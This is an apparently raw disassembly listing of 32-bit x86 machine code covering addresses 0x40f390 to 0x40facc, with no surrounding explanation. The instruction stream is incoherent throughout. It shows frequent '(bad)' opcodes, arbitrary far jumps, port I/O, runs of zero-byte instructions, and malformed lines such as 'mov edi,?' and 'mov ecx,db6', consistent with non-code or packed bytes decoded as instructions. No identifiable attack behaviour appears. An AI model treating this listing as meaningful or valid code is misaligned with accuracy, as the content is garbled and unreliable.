  40f390:	or     eax,0xfe517385
  40f395:	jmp    DWORD PTR ds:0x910f1e45
  40f39b:	js     0x40f3b5
  40f39d:	add    BYTE PTR [edi+ecx*8],cl
  40f3a0:	jnp    0x40f3b6
  40f3a2:	add    BYTE PTR [eax],al
  40f3a4:	add    BYTE PTR [eax],al
  40f3a6:	add    BYTE PTR [ebp+0x24],dh
  40f3a9:	adc    eax,0x7c86dc00
  40f3ae:	cmp    al,0xcc
  40f3b0:	xor    eax,DWORD PTR [edi]
  40f3b2:	cmp    ebx,DWORD PTR [edx-0x627bf2d2]
  40f3b8:	pop    esi
  40f3b9:	(bad)  
  40f3ba:	jmp    DWORD PTR [edx-0x7ffde9bc]
  40f3c0:	sub    al,0x89
  40f3c2:	dec    esi
  40f3c3:	and    al,0xfd
  40f3c5:	fdiv   DWORD PTR [ecx+ecx*4-0x3]
  40f3c9:	pop    ebp
  40f3ca:	ins    BYTE PTR es:[edi],dx
  40f3cb:	retf   
  40f3cc:	sub    DWORD PTR [ecx],0x18
  40f3cf:	mov    edi,?
  40f3d1:	mov    al,BYTE PTR [esi+0x74]
  40f3d4:	cmp    DWORD PTR [esi+0xb397574],0xffffffd9
  40f3db:	jp     0x40f3c0
  40f3dd:	out    dx,al
  40f3de:	pop    ss
  40f3df:	jne    0x40f43a
  40f3e1:	fdiv   st(7),st
  40f3e3:	and    eax,0x91557ee9
  40f3e8:	loopne 0x40f42d
  40f3ea:	out    0x0,eax
  40f3ec:	popf   
  40f3ed:	add    al,BYTE PTR [eax]
  40f3ef:	clc    
  40f3f0:	sbb    BYTE PTR [eax],al
  40f3f2:	test   BYTE PTR [ebx+0x1],dh
  40f3f5:	add    al,0x0
  40f3f7:	pop    esi
  40f3f8:	push   es
  40f3f9:	jge    0x40f440
  40f3fb:	imul   ebx,DWORD PTR [eax+0x3a],0x84541c3a
  40f402:	mul    BYTE PTR [edx+0x59]
  40f405:	add    cl,BYTE PTR [ebx-0x76c3ffc2]
  40f40b:	add    BYTE PTR [eax],al
  40f40d:	add    BYTE PTR [eax],al
  40f40f:	add    BYTE PTR [edi+ecx*2-0x218dd448],al
  40f416:	pop    edx
  40f417:	push   ss
  40f418:	jne    0x40f473
  40f41a:	xor    edi,0x74
  40f41d:	ins    DWORD PTR es:[edi],dx
  40f41e:	dec    BYTE PTR [ecx+0x460c5ab4]
  40f424:	push   eax
  40f425:	push   esp
  40f426:	test   esi,edx
  40f428:	bound  ebx,QWORD PTR [ecx+0x2]
  40f42b:	inc    edi
  40f42c:	fdiv   QWORD PTR [edx-0x701501ab]
  40f432:	mov    al,0x67
  40f434:	into   
  40f435:	xor    edi,DWORD PTR [edx-0x7b]
  40f438:	in     eax,dx
  40f439:	pop    eax
  40f43a:	add    al,BYTE PTR [eax]
  40f43c:	jbe    0x40f459
  40f43e:	fdivr  QWORD PTR [edx]
  40f440:	lods   eax,DWORD PTR ds:[esi]
  40f441:	aas    
  40f442:	popa   
  40f443:	mov    BYTE PTR [eax],ah
  40f445:	push   ecx
  40f446:	pop    ecx
  40f447:	loop   0x40f40c
  40f449:	and    eax,0x1e2901ec
  40f44e:	jnp    0x40f49d
  40f450:	sbb    DWORD PTR [eax+0x2b],edx
  40f453:	jb     0x40f4b2
  40f455:	add    dh,BYTE PTR [edx-0x3a]
  40f458:	add    BYTE PTR [ebp-0x277c2758],0xe8
  40f45f:	mov    bl,0xf9
  40f461:	mov    bl,0xec
  40f463:	jp     0x40f41c
  40f465:	pop    ecx
  40f466:	dec    esi
  40f467:	or     esi,DWORD PTR [ebp+0x2]
  40f46a:	xchg   edx,eax
  40f46b:	jge    0x40f46c
  40f46d:	rcl    ah,0x1a
  40f470:	cmp    eax,0xff900e
  40f475:	add    BYTE PTR [eax],al
  40f477:	add    BYTE PTR [eax],al
  40f479:	sti    
  40f47a:	jl     0x40f479
  40f47c:	add    esi,DWORD PTR [ebp+0x7c]
  40f47f:	icebp  
  40f480:	or     ebx,eax
  40f482:	push   ss
  40f483:	out    0x88,al
  40f485:	retf   
  40f486:	icebp  
  40f487:	call   0xe78bea8f
  40f48c:	xlat   BYTE PTR ds:[ebx]
  40f48d:	pop    ss
  40f48e:	jge    0x40f439
  40f490:	add    al,0x1e
  40f492:	jo     0x40f4fd
  40f494:	into   
  40f495:	push   0x2
  40f497:	inc    edx
  40f498:	jb     0x40f491
  40f49a:	enter  0x3a8,0x6a
  40f49e:	jg     0x40f423
  40f4a0:	not    BYTE PTR [edx]
  40f4a2:	dec    edx
  40f4a3:	imul   ecx,esi,0xe49402ba
  40f4a9:	out    dx,eax
  40f4aa:	mov    eax,0xcf1c0a94
  40f4af:	addr16 jnp 0x40f4ea
  40f4b2:	jmp    0x2cb1:0xe966446b
  40f4b9:	jae    0x40f440
  40f4bb:	das    
  40f4bc:	neg    edx
  40f4be:	dec    ecx
  40f4bf:	push   edx
  40f4c0:	add    al,0x25
  40f4c2:	ja     0x40f502
  40f4c4:	lock inc DWORD PTR [ebp-0x40]
  40f4c8:	mov    esp,0x88e9027f
  40f4cd:	cli    
  40f4ce:	stc    
  40f4cf:	fs pop ss
  40f4d1:	mov    al,BYTE PTR [edx]
  40f4d3:	add    cl,ch
  40f4d5:	dec    edi
  40f4d6:	sbb    cl,BYTE PTR [ebx-0x37e35ad9]
  40f4dc:	loop   0x40f4de
  40f4de:	add    BYTE PTR [eax],al
  40f4e0:	add    BYTE PTR [eax],al
  40f4e2:	dec    ecx
  40f4e3:	clc    
  40f4e4:	xchg   ah,al
  40f4e6:	mov    ecx,DWORD PTR [ecx-0x2]
  40f4e9:	arpl   WORD PTR [edi-0x7c42b1f5],cx
  40f4ef:	jle    0x40f50a
  40f4f1:	fidiv  WORD PTR [esi+0x2]
  40f4f4:	add    DWORD PTR [ecx+0x630bce79],0x37
  40f4fb:	add    bh,BYTE PTR [edx]
  40f4fd:	daa    
  40f4fe:	xchg   esp,eax
  40f4ff:	stc    
  40f500:	test   al,dh
  40f502:	arpl   WORD PTR [ecx-0x2],cx
  40f505:	jb     0x40f53f
  40f507:	(bad)  [edx]
  40f509:	scas   eax,DWORD PTR es:[edi]
  40f50a:	pop    edx
  40f50b:	pop    edx
  40f50c:	cmp    cl,BYTE PTR [esi-0x4d]
  40f50f:	dec    eax
  40f510:	cmp    ah,BYTE PTR [edi+0x3481f81a]
  40f516:	sub    BYTE PTR [ecx-0x2],cl
  40f519:	inc    eax
  40f51a:	sbb    DWORD PTR [eax-0x2],ecx
  40f51d:	cs lahf 
  40f51f:	mov    bh,0x6b
  40f521:	loop   0x40f56c
  40f523:	clc    
  40f524:	sub    edi,0xffffffc3
  40f527:	dec    eax
  40f528:	(bad)  
  40f529:	bound  esi,QWORD PTR [eax]
  40f52b:	icebp  
  40f52c:	test   BYTE PTR [ecx],ch
  40f52e:	sub    bl,BYTE PTR [esi]
  40f530:	cmp    esp,DWORD PTR [eax]
  40f532:	daa    
  40f533:	repnz imul ebp,ecx,0xd5557626
  40f53a:	outs   dx,DWORD PTR ds:[esi]
  40f53b:	inc    esp
  40f53c:	out    0x13,eax
  40f53e:	ins    BYTE PTR es:[edi],dx
  40f53f:	add    al,BYTE PTR [eax]
  40f541:	ins    BYTE PTR es:[edi],dx
  40f542:	xor    esi,ecx
  40f544:	sub    al,0x1a
  40f546:	add    BYTE PTR [eax],al
  40f548:	add    BYTE PTR [eax],al
  40f54a:	add    BYTE PTR [ecx],bh
  40f54c:	jl     0x40f59a
  40f54e:	in     eax,0x4f
  40f550:	ja     0x40f4ed
  40f552:	jmp    0x129f7cd
  40f557:	sbb    DWORD PTR [eax-0x2],0xffffffff
  40f55b:	daa    
  40f55c:	inc    eax
  40f55d:	sbb    ch,BYTE PTR [ebx]
  40f55f:	aam    0xfa
  40f561:	fdiv   DWORD PTR [edi-0x45]
  40f564:	retf   
  40f565:	or     DWORD PTR [edx],edi
  40f567:	bound  esp,QWORD PTR [edx]
  40f569:	jne    0x40f54b
  40f56b:	pop    ds
  40f56c:	mov    dh,0xff
  40f56e:	jae    0x40f504
  40f570:	retf   0x141
  40f573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f574:	sub    esi,DWORD PTR ds:[ebp-0x21]
  40f578:	retf   0x6c44
  40f57b:	inc    edi
  40f57c:	sbb    bh,BYTE PTR ds:[ebx]
  40f57f:	add    al,0x30
  40f581:	(bad)  
  40f582:	jmp    0x3eae31
  40f587:	xchg   edi,eax
  40f588:	cwde   
  40f589:	data16 jne 0x40f5e4
  40f58c:	repz enter 0x40eb,0xfb
  40f591:	pop    ebp
  40f592:	js     0x40f5bf
  40f594:	dec    BYTE PTR [ebx+eax*2+0x7844cbb3]
  40f59b:	and    ebp,DWORD PTR [esi+0x41]
  40f59e:	call   DWORD PTR [edi-0x55f0cd78]
  40f5a4:	add    cl,BYTE PTR [eax]
  40f5a6:	rol    DWORD PTR [ebp+0x1de182fa],0xfb
  40f5ad:	pop    ebp
  40f5ae:	ins    BYTE PTR es:[edi],dx
  40f5af:	add    BYTE PTR [eax],al
  40f5b1:	add    BYTE PTR [eax],al
  40f5b3:	add    dh,ch
  40f5b5:	push   ebp
  40f5b6:	mov    DWORD PTR [esi-0x10],eax
  40f5b9:	cmp    BYTE PTR [esi+0x5cfb1f74],0x8
  40f5c0:	push   0x45
  40f5c2:	xor    edx,edx
  40f5c4:	push   ds
  40f5c5:	int    0x54
  40f5c7:	pop    esp
  40f5c8:	daa    
  40f5c9:	ret    0x8f0d
  40f5cc:	inc    DWORD PTR [ebx]
  40f5ce:	add    BYTE PTR [eax],al
  40f5d0:	outs   dx,DWORD PTR ds:[esi]
  40f5d1:	mov    esi,0x607510e9
  40f5d6:	xchg   esp,eax
  40f5d7:	add    ch,dh
  40f5d9:	prefetcht0 BYTE PTR [edi]
  40f5dc:	add    edx,DWORD PTR [esi+0x0]
  40f5df:	rcr    DWORD PTR [ebp+0x74df7f5d],0xe3
  40f5e6:	repz inc esi
  40f5e8:	cmc    
  40f5e9:	xchg   ebx,eax
  40f5ea:	add    eax,0x302c6c75
  40f5ef:	cmp    dh,BYTE PTR [eax+ebx*2+0x589ec176]
  40f5f6:	psrld  mm7,QWORD PTR [esi]
  40f5f9:	call   0x8440:0xd4b794fb
  40f600:	xor    eax,0x66df8658
  40f605:	ror    BYTE PTR [ebx-0x18],1
  40f608:	mov    eax,0xeefe4bd8
  40f60d:	xchg   esi,eax
  40f60e:	jmp    0xc1bf:0x8535c38a
  40f615:	push   esp
  40f616:	pop    es
  40f617:	fld    DWORD PTR [eax]
  40f619:	add    BYTE PTR [eax],al
  40f61b:	add    BYTE PTR [eax],al
  40f61d:	(bad)  
  40f61e:	cmc    
  40f61f:	fcos   
  40f621:	stos   BYTE PTR es:[edi],al
  40f622:	into   
  40f623:	mov    ah,0x1b
  40f625:	(bad)  
  40f626:	sbb    ebx,DWORD PTR [ebx-0x1]
  40f629:	ins    BYTE PTR es:[edi],dx
  40f62a:	pop    ecx
  40f62b:	add    al,BYTE PTR [ebp+0x21852835]
  40f631:	sbb    ah,BYTE PTR [eax]
  40f633:	dec    esp
  40f634:	jmp    0x215e:0x1bc4d458
  40f63b:	or     cl,bl
  40f63d:	mov    dl,BYTE PTR [ebp+0x78]
  40f640:	or     bh,BYTE PTR [edi]
  40f642:	(bad)  
  40f643:	push   ds
  40f644:	jne    0x40f5ce
  40f646:	fmul   QWORD PTR [edx+0x0]
  40f649:	jp     0x40f620
  40f64b:	add    edi,edi
  40f64d:	loop   0x40f6a6
  40f64f:	ja     0x40f693
  40f651:	je     0x40f655
  40f653:	and    eax,edx
  40f655:	mov    eax,ds:0xc84f64f7
  40f65a:	inc    esi
  40f65b:	aad    0x7f
  40f65d:	mov    bh,0xc2
  40f65f:	adc    edx,eax
  40f661:	dec    esi
  40f662:	imul   DWORD PTR [edx+0x65]
  40f665:	mov    cl,0x46
  40f667:	mov    ebp,0x6bc6307f
  40f66c:	inc    esp
  40f66d:	jae    0x40f6ed
  40f66f:	les    ecx,FWORD PTR [edx-0x65]
  40f672:	inc    esi
  40f673:	loope  0x40f61d
  40f675:	jp     0x40f66e
  40f677:	data16 das 
  40f679:	mov    BYTE PTR [esi-0x6b],al
  40f67c:	pop    ss
  40f67d:	lods   al,BYTE PTR ds:[esi]
  40f67e:	rcr    BYTE PTR [edi-0x46],0x0
  40f682:	add    BYTE PTR [eax],al
  40f684:	add    BYTE PTR [eax],al
  40f686:	push   ds
  40f687:	or     ebp,DWORD PTR [eax+0x7e3800fb]
  40f68d:	dec    ebx
  40f68e:	imul   ebx,ecx,0x7c
  40f691:	lods   al,BYTE PTR ds:[esi]
  40f692:	dec    ebp
  40f693:	outs   dx,BYTE PTR ds:[esi]
  40f695:	dec    ebx
  40f696:	pop    ebx
  40f697:	or     al,bh
  40f699:	xlat   BYTE PTR ds:[ebx]
  40f69a:	(bad)  
  40f69b:	xor    ebp,ebp
  40f69d:	xchg   ecx,eax
  40f69e:	ja     0x40f719
  40f6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6a1:	movzx  ecx,BYTE PTR [esp+eiz*8-0x5]
  40f6a6:	jbe    0x40f703
  40f6a8:	dec    ebx
  40f6a9:	dec    edx
  40f6aa:	xor    eax,DWORD PTR [esi+0x1]
  40f6ad:	stos   BYTE PTR es:[edi],al
  40f6ae:	sahf   
  40f6af:	shl    DWORD PTR [ebx+edi*8-0x18],1
  40f6b3:	add    DWORD PTR [edx-0x46],esp
  40f6b6:	rcr    WORD PTR [esi],0x0
  40f6ba:	jge    0x40f6ba
  40f6bc:	in     eax,dx
  40f6bd:	jg     0x40f6ab
  40f6bf:	inc    esp
  40f6c0:	adc    eax,0xb7e0d4b
  40f6c5:	dec    ebx
  40f6c6:	sti    
  40f6c7:	or     DWORD PTR [edi-0x125c9829],esp
  40f6cd:	xchg   ecx,eax
  40f6ce:	ja     0x40f749
  40f6d0:	jmp    DWORD PTR [esi-0x1a0a3e8e]
  40f6d6:	fiadd  WORD PTR [edx]
  40f6d8:	jmp    0xfe853379
  40f6dd:	and    bl,BYTE PTR [edi]
  40f6df:	fidiv  DWORD PTR [edx+0x65]
  40f6e2:	mov    edi,0xfc62028f
  40f6e7:	adc    DWORD PTR [ebx-0x41],eax
  40f6ea:	add    BYTE PTR [eax],al
  40f6ec:	add    BYTE PTR [eax],al
  40f6ee:	add    BYTE PTR [edx+0x6cd200fd],dh
  40f6f4:	or     BYTE PTR [esi+0x45],bl
  40f6f7:	sahf   
  40f6f8:	xor    BYTE PTR [ebp-0x52],0x2f
  40f6fc:	inc    esp
  40f6fd:	push   cs
  40f6fe:	pop    edi
  40f6ff:	jnp    0x40f77a
  40f701:	dec    ebp
  40f702:	aad    0xb3
  40f704:	dec    edi
  40f705:	add    esp,ecx
  40f707:	xchg   BYTE PTR [edx-0x77],bl
  40f70a:	(bad)  
  40f70b:	das    
  40f70c:	inc    esp
  40f70d:	cmp    ah,BYTE PTR [edi]
  40f70f:	dec    ebp
  40f710:	hlt    
  40f711:	sbb    BYTE PTR [esi+edi*4],0x44
  40f715:	(bad)  
  40f716:	out    0x4,al
  40f718:	add    BYTE PTR [ebx-0xa3e7ae1],cl
  40f71e:	in     eax,dx
  40f71f:	dec    esi
  40f720:	cmc    
  40f721:	jmp    0x9012:0x6bb7cb7e
  40f728:	hlt    
  40f729:	and    BYTE PTR [edi+ebp*4+0x4f6fe44],0x0
  40f731:	inc    ebx
  40f732:	push   0xffffffbe
  40f734:	sti    
  40f735:	push   cs
  40f736:	ins    DWORD PTR es:[edi],dx
  40f737:	adc    DWORD PTR [esi-0x2],eax
  40f73a:	cs pop ds
  40f73c:	jg     0x40f75e
  40f73e:	daa    
  40f73f:	mov    edi,0x2218244
  40f744:	iret   
  40f745:	and    DWORD PTR [edx-0x52],ebp
  40f748:	div    BYTE PTR [ebx-0x44]
  40f74b:	ins    DWORD PTR es:[edi],dx
  40f74c:	jg     0x40f74d
  40f74e:	(bad)  
  40f74f:	fadd   QWORD PTR [eax]
  40f751:	je     0x40f769
  40f753:	add    BYTE PTR [eax],al
  40f755:	add    BYTE PTR [eax],al
  40f757:	add    BYTE PTR [ecx],ch
  40f759:	and    BYTE PTR [eax],ah
  40f75b:	add    ah,cl
  40f75d:	inc    edi
  40f75e:	test   BYTE PTR ds:0x3dfdbaca,al
  40f764:	gs push ds
  40f766:	add    BYTE PTR [eax],al
  40f768:	fild   DWORD PTR [ecx-0x45540208]
  40f76e:	xor    eax,eax
  40f770:	gs inc eax
  40f772:	pop    esi
  40f773:	mov    ecx,db6
  40f776:	sti    
  40f777:	(bad)  
  40f778:	jmp    0x40f722
  40f77a:	(bad)  
  40f77c:	jmp    0x40f738
  40f77e:	cmp    ecx,ebx
  40f780:	mov    ebx,0xdbfcd27d
  40f785:	mov    edx,0x49863b7e
  40f78a:	or     ebx,0xffffffe8
  40f78d:	mov    edx,0x4f543fd
  40f792:	sti    
  40f793:	(bad)  
  40f794:	sti    
  40f795:	cmc    
  40f796:	pop    ebp
  40f797:	ins    BYTE PTR es:[edi],dx
  40f798:	pop    ebx
  40f799:	jg     0x40f774
  40f79b:	(bad)  
  40f79c:	jmp    0x40f757
  40f79e:	or     eax,0xc794fb6
  40f7a3:	sbb    BYTE PTR [eax+eax*1+0x43],bl
  40f7a7:	cmp    ebx,DWORD PTR [ebp-0x2ff0d4cf]
  40f7ad:	jno    0x40f7aa
  40f7af:	jmp    FWORD PTR [ebx+0x2b09f67d]
  40f7b5:	les    ebp,FWORD PTR [ebp+edi*8-0x77e4695]
  40f7bc:	add    BYTE PTR [eax],al
  40f7be:	add    BYTE PTR [eax],al
  40f7c0:	add    BYTE PTR [ecx+ecx*2-0x7e],ch
  40f7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c5:	dec    ecx
  40f7c6:	mov    ecx,0xfebc3dfd
  40f7cb:	(bad)  
  40f7cc:	call   FWORD PTR [ebx]
  40f7ce:	les    ebx,FWORD PTR [eax+0x48ec75fd]
  40f7d4:	cmp    al,0xf5
  40f7d6:	dec    ebx
  40f7d7:	add    al,BYTE PTR [eax]
  40f7d9:	fmul   QWORD PTR [ecx+0x48]
  40f7dc:	(bad)  
  40f7dd:	jmp    0xf759:0x75200286
  40f7e4:	and    DWORD PTR [edx+0x55],0x4f90fe47
  40f7eb:	and    al,BYTE PTR [eax]
  40f7ed:	jne    0x40f843
  40f7ef:	cmp    BYTE PTR [ecx-0x40],0x2c
  40f7f3:	inc    edi
  40f7f4:	cmp    al,0x8a
  40f7f6:	stc    
  40f7f7:	add    eax,DWORD PTR [eax]
  40f7f9:	adc    ch,0xd7
  40f7fc:	cld    
  40f7fd:	stos   BYTE PTR es:[edi],al
  40f7fe:	test   BYTE PTR ds:0x259555f,al
  40f804:	psllw  mm7,QWORD PTR [ebp+0x5e92fe46]
  40f80b:	add    dh,BYTE PTR [eax]
  40f80d:	jne    0x40f868
  40f80f:	pop    ecx
  40f810:	mov    ecx,0x3a476c83
  40f815:	sbb    eax,DWORD PTR [ebp-0x9]
  40f818:	adc    bh,0x7b
  40f81b:	inc    edi
  40f81c:	(bad)  
  40f81d:	jp     0x40f82a
  40f81f:	add    al,0xb9
  40f821:	jae    0x40f854
  40f823:	add    al,BYTE PTR [eax]
  40f825:	add    BYTE PTR [eax],al
  40f827:	add    BYTE PTR [eax],al
  40f829:	add    BYTE PTR [esi-0x5f89be70],dh
  40f82f:	dec    esp
  40f830:	jle    0x40f861
  40f832:	dec    ecx
  40f833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f834:	inc    edi
  40f835:	cmp    BYTE PTR ds:0x9283f762,0xb5
  40f83c:	inc    edi
  40f83d:	(bad)  
  40f83e:	test   al,0x22
  40f841:	psllw  mm4,QWORD PTR [edx]
  40f844:	inc    esi
  40f845:	(bad)  
  40f846:	and    cl,BYTE PTR [esi-0x5e]
  40f849:	call   FWORD PTR [edx]
  40f84b:	pop    ecx
  40f84c:	test   DWORD PTR [ebx+0x48250266],0xf169050b
  40f856:	add    al,BYTE PTR [ebx-0x1]
  40f859:	mov    dh,0xf9
  40f85b:	inc    edx
  40f85c:	or     eax,0xe9227506
  40f861:	add    edi,DWORD PTR [edx-0x80]
  40f864:	in     al,dx
  40f865:	inc    esi
  40f866:	jecxz  0x40f8aa
  40f868:	mov    bl,0xfd
  40f86a:	jp     0x40f86e
  40f86c:	jmp    0xe18ff169
  40f871:	inc    edi
  40f872:	retf   
  40f873:	add    al,0xe
  40f875:	and    al,0x75
  40f877:	add    ah,dh
  40f879:	jg     0x40f84d
  40f87b:	inc    esi
  40f87c:	int    0x47
  40f87e:	jno    0x40f823
  40f880:	or     BYTE PTR [esi*2-0x60d69b0d],al
  40f887:	inc    edx
  40f888:	mov    ch,0x9
  40f88a:	jne    0x40f89e
  40f88c:	jmp    0x40f894
  40f891:	add    BYTE PTR [eax],al
  40f893:	pushf  
  40f894:	jmp    0x40f839
  40f896:	inc    edi
  40f897:	mov    eax,DWORD PTR [esi]
  40f899:	aas    
  40f89a:	fdiv   DWORD PTR [ebx+0x7f]
  40f89d:	jg     0x40f8e8
  40f89f:	jnp    0x40f8e3
  40f8a1:	fisttp QWORD PTR [ebp+0x4c69c577]
  40f8a7:	jl     0x40f8ba
  40f8a9:	imul   ecx,DWORD PTR [ecx-0x7c8abda1],0x62
  40f8b0:	adc    dh,bl
  40f8b2:	jge    0x40f8e8
  40f8b4:	aas    
  40f8b5:	gs inc edi
  40f8b7:	mov    DWORD PTR [edi+0x117503e8],eax
  40f8bd:	ins    DWORD PTR es:[edi],dx
  40f8be:	(bad)  
  40f8bf:	ds inc edx
  40f8c1:	dec    ebp
  40f8c2:	or     DWORD PTR [edx-0x1e],ebx
  40f8c5:	call   0x5ec972cd
  40f8ca:	dec    ebx
  40f8cb:	and    eax,DWORD PTR [edx-0x1]
  40f8ce:	repz jns 0x40f8b3
  40f8d1:	(bad)  
  40f8d2:	call   0x25e180e2
  40f8d7:	mov    dl,0x40
  40f8d9:	call   0xfe81a74d
  40f8de:	rcl    al,cl
  40f8e0:	lods   eax,DWORD PTR ds:[esi]
  40f8e1:	push   cs
  40f8e2:	push   0x15
  40f8e4:	aas    
  40f8e5:	inc    BYTE PTR [esi]
  40f8e7:	loop   0x40f960
  40f8e9:	add    ch,BYTE PTR [edx-0x19f6c609]
  40f8ef:	hlt    
  40f8f0:	xchg   ebx,edi
  40f8f2:	out    dx,al
  40f8f3:	cmp    eax,DWORD PTR [edi+esi*8+0xf4]
  40f8fa:	add    BYTE PTR [eax],al
  40f8fc:	ret    
  40f8fd:	xchg   DWORD PTR [esi-0x1e],ebp
  40f900:	cmp    eax,DWORD PTR [eax+0x3c]
  40f903:	ins    BYTE PTR es:[edi],dx
  40f904:	jbe    0x40f908
  40f906:	add    dh,bl
  40f908:	xor    ah,BYTE PTR [ebp-0x1cc3906]
  40f90e:	or     DWORD PTR es:[ecx+0x2],edi
  40f912:	movq   mm7,QWORD PTR [ebx+0x7daefe3d]
  40f919:	jmp    0x40f93a
  40f91b:	jmp    0x3dc80a96
  40f920:	sub    eax,0xb980fe40
  40f925:	cmp    al,0xfe
  40f927:	mov    gs,WORD PTR [ebx+0x77]
  40f92a:	inc    esi
  40f92b:	call   0xeb8f7093
  40f930:	mov    ecx,0xb1e20761
  40f935:	add    al,0xc0
  40f937:	push   0xffffff93
  40f939:	add    al,0x89
  40f93b:	lods   al,BYTE PTR ds:[esi]
  40f93c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f93d:	cld    
  40f93e:	inc    esp
  40f93f:	stc    
  40f940:	sub    eax,0x42a78b14
  40f945:	mov    es,WORD PTR [ebx]
  40f947:	push   0x8509af
  40f94c:	gs dec ebp
  40f94e:	add    eax,0x2940fc8b
  40f953:	shl    DWORD PTR [edi+0x5d2313a],1
  40f959:	outs   dx,DWORD PTR ds:[esi]
  40f95a:	inc    esi
  40f95b:	jne    0x40f977
  40f95d:	mov    esp,0x6c54
  40f962:	add    BYTE PTR [eax],al
  40f964:	add    BYTE PTR [edi],ah
  40f966:	hlt    
  40f967:	inc    eax
  40f968:	mov    cl,BYTE PTR [ebx]
  40f96a:	mov    esi,0x7ec0f453
  40f96f:	or     eax,0x59682
  40f974:	add    BYTE PTR [eax],ah
  40f976:	jl     0x40f9ec
  40f978:	inc    esp
  40f979:	and    BYTE PTR [edx+0xd],bh
  40f97c:	xchg   DWORD PTR [edx+0x5],esi
  40f97f:	add    BYTE PTR [eax],al
  40f981:	ret    
  40f982:	mov    ss,WORD PTR [ebp+0x4]
  40f985:	pop    edi
  40f986:	std    
  40f987:	cmp    cl,BYTE PTR [ebp-0x2d]
  40f98a:	mov    es,WORD PTR [ebp+0x2]
  40f98d:	shl    DWORD PTR [eax-0x259e7641],cl
  40f993:	or     eax,0xc10553b6
  40f998:	loope  0x40f92e
  40f99a:	cmp    esi,eax
  40f99c:	(bad)  
  40f99e:	jg     0x40f9a1
  40f9a0:	sar    esp,0x3d
  40f9a3:	or     edx,eax
  40f9a5:	add    eax,0x4989fa79
  40f9aa:	into   
  40f9ab:	jae    0x40f9b5
  40f9ad:	(bad)  
  40f9ae:	(bad)  
  40f9b1:	jae    0x40f96e
  40f9b3:	inc    ebx
  40f9b4:	clc    
  40f9b5:	out    0x6f,eax
  40f9b7:	repnz or DWORD PTR [ebx],0x40
  40f9bb:	jmp    0xbecf2ced
  40f9c0:	lea    eax,[edx+ecx*4]
  40f9c3:	and    ecx,0xec4bbd4d
  40f9c9:	add    BYTE PTR [eax],al
  40f9cb:	add    BYTE PTR [eax],al
  40f9cd:	add    BYTE PTR [ebp+0x28],dh
  40f9d0:	test   BYTE PTR [edi-0x3da3b9],al
  40f9d6:	jnp    0x40f95f
  40f9d8:	sbb    ecx,0xffffffa7
  40f9db:	imul   eax,DWORD PTR [edx],0x4666ec47
  40f9e1:	mov    BYTE PTR [eax-0x7f40810f],bh
  40f9e7:	xor    DWORD PTR [edx-0x3adefd02],ecx
  40f9ed:	mov    BYTE PTR [eax-0x7d2e80ef],dh
  40f9f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9f4:	sbb    dh,al
  40f9f6:	jmp    0xaeb2:0x37d21108
  40f9fd:	adc    ebx,DWORD PTR [esi-0x2dd2381d]
  40fa03:	mov    dh,0xea
  40fa05:	mov    ah,BYTE PTR [eax]
  40fa07:	pop    ebp
  40fa08:	inc    ebx
  40fa09:	je     0x40f9d0
  40fa0b:	mov    ah,0x3c
  40fa0d:	mov    ch,BYTE PTR [esi-0x4d1127bf]
  40fa13:	push   eax
  40fa14:	jge    0x40f9d5
  40fa16:	jp     0x40f9c5
  40fa18:	int    0x14
  40fa1a:	jne    0x40fa45
  40fa1c:	call   FWORD PTR [ecx+eiz*4+0x78]
  40fa20:	mov    ebp,0xefe6fe13
  40fa25:	cmp    dh,BYTE PTR [eax]
  40fa27:	gs (bad) 
  40fa29:	xlat   BYTE PTR ds:[ebx]
  40fa2a:	out    dx,al
  40fa2b:	out    dx,al
  40fa2c:	inc    edi
  40fa2d:	mov    dh,BYTE PTR [eax]
  40fa2f:	xchg   ecx,eax
  40fa30:	pop    es
  40fa31:	enter  0x0,0x0
  40fa35:	add    BYTE PTR [eax],al
  40fa37:	and    BYTE PTR [ebp-0x779511a7],0x7f
  40fa3e:	jl     0x40fa91
  40fa40:	sub    ebx,esi
  40fa42:	sbb    DWORD PTR [eax],0x5d
  40fa45:	add    al,BYTE PTR [eax]
  40fa47:	(bad)  
  40fa48:	in     eax,0x47
  40fa4a:	mov    BYTE PTR [eax-0x468702fe],dh
  40fa50:	out    0xa8,al
  40fa52:	jp     0x40fa05
  40fa54:	out    0xb8,al
  40fa56:	pop    edx
  40fa57:	clc    
  40fa58:	adc    eax,0xb52a03e9
  40fa5d:	loopne 0x40fad7
  40fa5f:	leave  
  40fa60:	ss cmp eax,0x2e8b0ace
  40fa66:	js     0x40faa7
  40fa68:	sub    dl,ch
  40fa6a:	push   esp
  40fa6b:	or     edi,DWORD PTR [edi]
  40fa6d:	imul   eax,DWORD PTR [ebx+0x73],0xffffff86
  40fa71:	retf   0xfaee
  40fa74:	ds jmp 0x4269e120
  40fa7a:	push   esp
  40fa7b:	jmp    0x40fabb
  40fa7d:	jae    0x40fa3b
  40fa7f:	jne    0x40fa04
  40fa81:	and    eax,0xfcc4ec22
  40fa86:	js     0x40fb03
  40fa88:	(bad)  
  40fa89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa8a:	rcr    DWORD PTR [ecx-0x2],1
  40fa8d:	xor    DWORD PTR [edx-0x44d4017f],edi
  40fa93:	push   ecx
  40fa94:	setg   bl
  40fa97:	jbe    0x40fa8c
  40fa99:	lahf   
  40fa9a:	add    BYTE PTR [eax],al
  40fa9c:	add    BYTE PTR [eax],al
  40fa9e:	add    BYTE PTR [eax],al
  40faa0:	cmp    BYTE PTR [edi],cl
  40faa2:	jg     0x40fa6f
  40faa4:	je     0x40fab5
  40faa6:	push   ebp
  40faa7:	inc    ebp
  40faa8:	in     eax,dx
  40faa9:	int3   
  40faaa:	les    edx,FWORD PTR [ebx]
  40faac:	retf   
  40faad:	into   
  40faae:	out    0x44,eax
  40fab0:	xchg   ebp,eax
  40fab1:	or     edx,esi
  40fab3:	dec    ebx
  40fab4:	jae    0x40fb2e
  40fab6:	and    eax,0xe021b407
  40fabb:	push   cs
  40fabc:	aaa    
  40fabd:	mov    WORD PTR [ebx],ds
  40fabf:	inc    eax
  40fac0:	std    
  40fac1:	mov    DWORD PTR [eax+0x7d7a7ab9],0xffbe5b43
  40facb:	pop    edi
  40facc:	cmp    al,0x36
